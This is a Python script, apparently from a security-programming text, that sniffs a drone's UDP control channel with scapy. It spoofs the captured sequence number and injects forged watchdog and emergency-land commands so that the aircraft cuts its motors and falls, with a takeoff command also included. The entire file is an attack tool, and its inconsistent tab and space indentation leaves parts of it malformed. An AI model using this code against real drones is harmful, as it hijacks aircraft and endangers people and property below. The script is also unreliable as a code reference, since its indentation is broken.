#!/usr/bin/python
# -*- coding: utf-8 -*-
import threading
import dup
from scapy.all import *

conf.iface = 'mon0'
NAVPORT = 5556
LAND = '290717696'
EMER = '290717952'
TAKEOFF = '290718208'

# Threaded class that has the fields that store information for
# our attack.  These fields contain the current intercepted 
# packet, specific UAV protocol sequence number, Boolean to 
# describe if UAV traffic has been intercepted
class interceptThread(threading.Thread):
	# Initialize the fields stated above
    def __init__(self):
        threading.Thread.__init__(self)
        self.curPkt = None
        self.seq = 0
        self.foundUAV = False

    # Start a sniffer filtered on udp 5556, which triggers the 
	# interceptPkt() method
	def run(self):
        sniff(prn=self.interceptPkt, filter='udp port 5556')

	# Changes the boolean of foundUAV to True if a packet is
	# found that is udp port 5556
    def interceptPkt(self, pkt):
        if self.foundUAV == False:
            print '[*] UAV Found.'
            self.foundUAV = True
        self.curPkt = pkt
        raw = pkt.sprintf('%Raw.load%')
        # Strip the sequence number from current UAV command 
		# and record current packet
		try:
            self.seq = int(raw.split(',')[0].split('=')[-1]) + 5
		except:
	    self.seq = 0
	
    # Duplicates each packet at each of the layers and then
	# adds the new instruction as the payload of the UDP layer
	def injectCmd(self, cmd):
        radio = dup.dupRadio(self.curPkt)
        dot11 = dup.dupDot11(self.curPkt)
        snap = dup.dupSNAP(self.curPkt)
        llc = dup.dupLLC(self.curPkt)
        ip = dup.dupIP(self.curPkt)
        udp = dup.dupUDP(self.curPkt)
        raw = Raw(load=cmd)
        injectPkt = radio / dot11 / llc / snap / ip / udp / raw
        # Scapy function to send the newly crafted packet
		sendp(injectPkt)
	# Forces unmanned UAV to stop motors and crash to ground
    def emergencyland(self):
        spoofSeq = self.seq + 100
        # Sets the watchdog counter to our new sequence counter
		watch = 'AT*COMWDG=%i\r' %spoofSeq
        # Sets the emergency landing command
		toCmd = 'AT*REF=%i,%s\r' % (spoofSeq + 1, EMER)
        self.injectCmd(watch)
        self.injectCmd(toCmd)

    def takeoff(self):
        spoofSeq = self.seq + 100
        watch = 'AT*COMWDG=%i\r' %spoofSeq
        toCmd = 'AT*REF=%i,%s\r' % (spoofSeq + 1, TAKEOFF)
        self.injectCmd(watch)
        self.injectCmd(toCmd)


def main():
    uavIntercept = interceptThread()
    uavIntercept.start()
    print '[*] Listening for UAV Traffic. Please WAIT...'
    while uavIntercept.foundUAV == False:
        pass

    while True:
        tmp = raw_input('[-] Press ENTER to Emergency Land UAV.')
        uavIntercept.emergencyland()

if __name__ == '__main__':
    main()
